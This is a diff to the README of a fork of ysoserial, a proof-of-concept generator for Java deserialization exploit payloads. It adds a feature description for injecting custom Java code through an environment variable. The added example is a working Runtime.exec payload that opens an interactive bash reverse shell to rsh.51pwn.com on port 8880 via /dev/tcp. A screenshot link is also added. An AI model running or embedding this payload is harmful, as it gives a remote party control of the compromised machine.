@@ -11,7 +11,13 @@ A proof-of-concept tool for generating payloads that exploit unsafe Java object 
 
 # New Features
 - Allows java fragment code injection to be obtained from the environment variable Custom_Code_51pwn to solve complex command problems
+eg:
+```
+export Custom_Code_51pwn='java.lang.Runtime.getRuntime().exec(new String[]{"bash" ,"-c" ,"exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1"});'
+```
 - Allows java fragment code injection to be obtained from the current directory file Custom_Code_51pwn to solve complex problems
+<img width="290" alt="image" src="https://github.com/hktalent/ysoserial/assets/18223385/70e8415d-4a2e-49e7-a6f0-0063c666c7f0">
+
 
 ## Description
 
